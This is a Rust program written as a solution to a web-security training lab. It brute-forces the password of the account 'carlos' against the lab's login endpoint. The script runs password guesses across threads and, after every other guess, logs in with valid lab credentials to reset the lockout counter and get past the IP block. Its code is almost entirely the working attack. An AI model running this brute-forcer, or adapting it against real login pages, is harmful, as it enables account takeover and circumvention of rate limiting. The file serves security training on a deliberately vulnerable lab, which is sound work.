/**********************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 28/8/2023
*
* Lab: Broken brute-force protection, IP block
*
* Steps: 1. Brute force carlos password
*        2. After every try, login with correct
*           credentials to bypass blocking
*
***********************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use lazy_static::lazy_static;
use rayon::{
    current_thread_index,
    prelude::{IntoParallelRefIterator, ParallelIterator},
    ThreadPool,
};
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    ops::Add,
    process,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Global variables
*******************/
lazy_static! {
    static ref VALID_PASSWORD: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref FAILED_PASSWORDS: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref FAILED_PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref REQUEST_COUNTER: AtomicUsize = AtomicUsize::new(0);
}

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a1b00e4045d76eb8237443600e900d8.web-security-academy.net/login";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // read passwords as one big string
    // change the path to your password list
    let passwords_big_string = fs::read_to_string("/home/ahmed/passwords").unwrap();

    // split the big string to a list of passwords
    // change \n to \r\n if you still a windows user
    let passwords = passwords_big_string.split("\n").collect();

    // capture the time before brute forcing
    let start_time = time::Instant::now();

    // set valid user
    let valid_user = "carlos";

    // start brute force carlos password
    // 2 is the number of threads, you can change this
    brute_force_password(start_time, url, &client, passwords, valid_user, 2);

    // if a valid password is found
    if VALID_PASSWORD.lock().unwrap().len() != 0 {
        // print valid credentials
        print_valid_credentials();
    } else {
        println!("\n{}", "[!] Couldn't find valid password".red());
    }

    print_finish_message(start_time);
    
    // some request will be failed due to unknow reseaon
    // print them after you finish to try them later
    print_failed_requests();

    // save results  to a file in the current working directory
    // you can change this name to what you want
    save_results(start_time, "results");
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .timeout(Duration::from_secs(5))
        .redirect(Policy::none())
        .build()
        .unwrap()
}

/***********************************************************************
* Function used to brute force passowrd
* Parameters:
    - Instant: to ouptut an updated elapsed time to the terminal
    - URL: the URL of the lab
    - client: the client we build using the build_client() function
    - passwords: the list of gathered usernames
    - valid user: the valid user to brute force his password
    - threads: the number of threads you want the enumeration to run in
************************************************************************/
fn brute_force_password(
    start_time: Instant,
    url: &str,
    client: &Client,
    passwords: Vec<&str>,
    valid_user: &str,
    threads: usize,
) {
    println!("");
    println!(
        "{}: {}",
        "✅ Valid user".white().bold(),
        valid_user.green().bold()
    );
    println!("[#] Brute forcing password..");
    // how many passwords will be tried in each thread
    let chunk_per_thread = passwords.len() / threads;

    // split the whole list to sublist to run each one in a thread
    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect();

    // run every sublist in a thread
    passwords_chunks.par_iter().for_each(|mini_list| {
        // total number of passwords that will be tried
        let total_counts = passwords.iter().count();

        // iterate over every sublist in its corresponing thread
        for (index, password) in mini_list.iter().enumerate() {
            // iterate only if no valid password is found
            if VALID_PASSWORD.lock().unwrap().len() == 0 {
                // update the success counter to output in the terminal
                let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);

                // update the failed counter to output in the terminal
                let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);

                // calculate the elapsed time
                let elapsed_time = start_time.elapsed().as_secs() / 60;

                // login with correct credentials every 2 tries
                if REQUEST_COUNTER.fetch_add(1, Ordering::Relaxed) % 2 == 0 {
                    let login_as_wiener = client
                        .post(url)
                        .form(&HashMap::from([
                            ("username", "wiener"),
                            ("password", "peter"),
                        ]))
                        .send();

                    // if loggin in succeeded
                    if let Ok(res) = login_as_wiener {
                        if res.status().as_u16() == 302 {
                            println!("{}", "\nSend correct creds.. OK".blue().bold())
                        } else {
                            // in this case of lab and due to multithreading, race conditions are likely to happen
                            // and the request with a wrong creds may be sent before the correct one was sent in the correct order
                            // so multi-threaded version of this lab will not be as useful as we want ( other labs is ok with multithreading and this problem doesn't exist)
                            // a workaround is to just wait the 1 minute of blocking before trying again
                            // this is not a very good solution, but you got the idea of how multithreading work and how to write them
                            println!("{}", "\nWaiting 1 minute..".yellow().bold());
                            thread::sleep(Duration::from_secs(60));
                        }
                    } else {
                        println!(
                            "{}",
                            "\n[!] Failed to Send correct creds for unknown reason"
                                .red()
                                .bold()
                        );
                    }
                }

                // print the updated information to the terminal
                print_progress(
                    elapsed_time,
                    fail_counter,
                    success_counter,
                    total_counts,
                    password,
                );

                // the POST date to submit
                let data = HashMap::from([("username", valid_user), ("password", password)]);

                // try to login
                let mut login = client.post(url).form(&data).send();

                // if the request succeeded
                if let Ok(res) = login {
                    // if the password is true
                    if res.status().as_u16() == 302 {
                        // update the global variable to the valid password; this is a thread-safe operation using mutexes
                        VALID_PASSWORD.lock().unwrap().push_str(password)
                    }
                } else {
                    // if the request faild for unknown reason try to send it again
                    login = client.post(url).form(&data).send();
                    if let Ok(res) = login {
                        if res.status().as_u16() == 302 {
                            VALID_PASSWORD.lock().unwrap().push_str(password)
                        }
                    } else {
                        // if the repeated request also failed,
                        // upate the counter and save the password to try it later
                        FAILED_PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
                        FAILED_PASSWORDS.lock().unwrap().push(password.to_string());
                    }
                }
            } else {
                return;
            }
        }
    });
}

/*************************************
* Function used print the update info
* to the terminal in a nice format
**************************************/
#[inline(always)]
fn print_progress(
    elapsed_time: u64,
    fail_counter: usize,
    success_counter: usize,
    total_counts: usize,
    text: &str,
) {
    print!(
        "\r{}: {:3} minutes || {}: {:3} || {} ({}/{}): {:50}",
        "Elapsed".yellow().bold(),
        elapsed_time,
        "Failed".red().bold(),
        fail_counter,
        "Trying".white().bold(),
        success_counter,
        total_counts,
        text.blue().bold()
    );
    io::stdout().flush().unwrap();
}

/********************************************************
* Function used to print the valid username and password
*********************************************************/
fn print_valid_credentials() {
    println!(
        "\n{}: username: {}, password: {}",
        "✅ Login successfully".white(),
        "carlos".green().bold(),
        VALID_PASSWORD.lock().unwrap().green().bold()
    );
}
/********************************************************
* Function used to print finish time
*********************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}
/****************************************************
* Function used print failed usernames and password
* that we tried 2 times earlier and also failed
*****************************************************/
#[inline(always)]
fn print_failed_requests() {
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    println!(
        "\n\n{}: {} \n{}: {:?}",
        "[!] Failed password count".red().bold(),
        failed_passwords.len().to_string().yellow().bold(),
        "[!] Failed password".red().bold(),
        failed_passwords
    )
}

/*********************************************
* Function used to save results to a txt file
**********************************************/
fn save_results(start_time: Instant, file_name: &str) {
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    let valid_pass = VALID_PASSWORD.lock().unwrap();
    let to_save = format!(
        "✅ Finished in: {elapsed_time:?} minutes \n\n\
    Username: {user}, Password: {pass} \n\n\
    [!] Failed passwords count: {fpasswords_count} \n\
    [!] Failed passwords: {fpasswords:?} \n\n",
        elapsed_time = start_time.elapsed().as_secs() / 60,
        fpasswords = failed_passwords,
        fpasswords_count = failed_passwords.len(),
        user = "carlos",
        pass = valid_pass
    );
    let new_file = fs::File::create(file_name);
    if let Ok(mut file_created) = new_file {
        write!(file_created, "{}", to_save);
        println!(
            "\n{}: {}",
            "Restults was saved to".yellow().bold(),
            file_name.green().bold()
        )
    } else {
        println!("\n{}", "[!] Couldn't create new file to save results".red());
    }
}
